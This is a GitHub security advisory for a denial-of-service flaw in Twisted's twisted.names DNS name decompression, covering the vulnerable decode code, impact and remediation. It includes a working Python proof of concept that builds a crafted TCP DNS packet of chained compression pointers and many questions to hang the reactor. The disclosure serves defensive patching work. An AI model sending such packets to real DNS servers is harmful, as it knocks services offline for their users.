# [H] Twisted has a Denial of Service (DoS) in twisted.names via Crafted DNS Compression Pointer Chains

## Summary
Severity: High
Advisory: GHSA-grgv-6hw6-v9g4
CVE: CVE-2026-42304
CWE: CWE-400, CWE-407
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-grgv-6hw6-v9g4
Type: github-advisory

## Affected
- PyPI: `Twisted` — affected >=0 <26.4.0rc2

## Details
### Details

The twisted.names module is vulnerable to a Denial of Service (DoS) attack via resource exhaustion during DNS name decompression. A remote, unauthenticated attacker can exploit this by sending a crafted TCP DNS packet containing deeply chained compression pointers. This flaw bypasses previous loop-prevention logic, causing the single-threaded Twisted reactor to hang while processing millions of recursive lookups, effectively freezing the server.

---

### Technical Details

The main issue is in twisted.names.dns.Name.decode. A visited set was added in 2011 (commit e11cd82) to prevent infinite loops, but there is still no limit on the number of pointer dereferences per message. Also, the visited set is reset for each Question record.

Because DNSServerFactory handles every record in QDCOUNT without checking them, an attacker can add thousands of questions that all refer to the same long chain of pointers. This makes the parser repeat a complex and unnecessary search.

```python
##  src/twisted/names/dns.py (Lines 595-631)

def decode(self, strio, length=None):
        visited = set()
        self.name = b""
        off = 0
        while 1:
            l = ord(readPrecisely(strio, 1))
            if l == 0:
                if off > 0:
                    strio.seek(off)
                return
            if (l >> 6) == 3:
                new_off = (l & 63) << 8 | ord(readPrecisely(strio, 1))
                if new_off in visited:
                    raise ValueError("Compression loop in encoded name")
                visited.add(new_off)
                if off == 0:
                    off = strio.tell()
                strio.seek(new_off)
                continue
            label = readPrecisely(strio, l)
            if self.name == b"":
                self.name = label
            else:
                self.name = self.name + b"." + label

```

---

### PoC

```python
import struct, time
from twisted.names import dns, server
from twisted.test import proto_helpers

def create_tcp_payload():
    num_pointers = 8000
    packet_length = 65533
    num_questions = (packet_length - (num_pointers * 2) - 12) // 6

    buffer = bytearray(packet_length)

    struct.pack_into("!HHHHHH", buffer, 0, 1, 0, num_questions, 0, 0, 0)

    ptr_offset = 12
    for _ in range(num_pointers - 1):
        struct.pack_into("!H", buffer, ptr_offset, 0xC000 | (ptr_offset + 2))
        ptr_offset += 2

    null_byte_offset = ptr_offset + 2
    struct.pack_into("!H", buffer, ptr_offset, 0xC000 | null_byte_offset)
    buffer[null_byte_offset] = 0

    question_offset = null_byte_offset + 1
    for _ in range(num_questions):
        if question_offset + 6 <= packet_length:
            struct.pack_into("!HHH", buffer, question_offset, 0xC000 | 12, 1, 1)
            question_offset += 6

    return packet_length, num_pointers, num_questions, struct.pack("!H", packet_length) + buffer

def test_dns_server():
    factory = server.DNSServerFactory(clients=[])
    protocol = factory.buildProtocol(("127.0.0.1", 10053))
    transport = proto_helpers.StringTransport()
    protocol.makeConnection(transport)

    pkt_len, num_ptrs, num_qs, payload = create_tcp_payload()
    print("payload")
    print(f"len={pkt_len} ptrs={num_ptrs} qs={num_qs}")

    start = time.time()
    protocol.dataReceived(payload)
    end = time.time()

    print(f"time={end - start:.4f}s")

if __name__ == "__main__":
    test_dns_server()
```

---

### Impact

A single malformed TCP packet is sufficient to block the Twisted reactor's event loop for several seconds. Because Twisted operates on a single-threaded cooperative multitasking model, this is a common Denial of Service (DoS). The process becomes unable to handle new connections, process I/O, or respond to existing requests, effectively paralyzing the server for the duration of the decompression.

---

### Remediation

- Update twisted.names.dns.Name.decode to add a required limit on pointer resolutions per DNS message
- Share the "resolved offset" state across all records in a single message to prevent redundant processing.
- Validate the number of questions before entering the decoding loop in Message.decode.

---

### Resources

https://cwe.mitre.org/data/definitions/400.html

https://cwe.mitre.org/data/definitions/407.html

https://datatracker.ietf.org/doc/html/rfc9267

https://github.com/twisted/twisted/blob/trunk/src/twisted/names/dns.py#L595

https://github.com/twisted/twisted/commit/e11cd82bdd79b3ebbb0e8635cbb9c76df2b5af09

---

**Author**: Tomas Illuminati

## References
- https://github.com/twisted/twisted/security/advisories/GHSA-grgv-6hw6-v9g4
- https://nvd.nist.gov/vuln/detail/CVE-2026-42304
- https://github.com/twisted/twisted/commit/e11cd82bdd79b3ebbb0e8635cbb9c76df2b5af09
- https://github.com/pypa/advisory-database/tree/main/vulns/twisted/PYSEC-2026-160.yaml
- https://github.com/twisted/twisted
